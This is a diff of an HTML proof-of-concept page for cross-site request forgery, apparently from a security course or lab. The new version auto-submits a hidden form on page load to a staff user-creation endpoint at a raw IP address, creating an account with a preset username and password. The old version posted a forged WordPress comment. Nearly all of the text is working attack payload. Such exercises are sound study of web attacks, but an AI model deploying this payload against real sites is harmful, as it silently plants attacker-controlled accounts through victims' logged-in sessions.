@@ -1,19 +1,21 @@
 <html>
-  <head></head>
+  <head>
+    <title></title>
+  </head>
   <body onload="document.csrfForm.submit()">
     <form
       name="csrfForm"
-      action="http://wpdistillery.vm/wp-comments-post.php"
+      action="https://104.198.208.81/red/public/staff/users/new.php"
       method="POST"
     >
-      <input type="hidden" name="comment" value="Oh no! I got fooled!" />
-      <input type="hidden" name="comment_post_ID" value="11" />
-      <input type="hidden" name="comment_parent" value="0" />
-      <input type="hidden" name="_wp_unfiltered_comment" value="4208142317" />
-      <input
-        type="submit"
-        value="CLICK ME! SOMETHING GOOD WILL HAPPEN, TRUST ME."
-      />
+      <input type="hidden" name="first_name" value="random" />
+      <input type="hidden" name="last_name" value="user" />
+      <input type="hidden" name="username" value="test" />
+      <input type="hidden" name="email" value="test@test.com" />
+      <input type="hidden" name="password" value="Cybersecurity1%21" />
+      <input type="hidden" name="confirm_password" value="Cybersecurity1%21" />
+      <input type="submit" />
     </form>
+    <iframe name="hidden_results" style="display: none"></iframe>
   </body>
 </html>
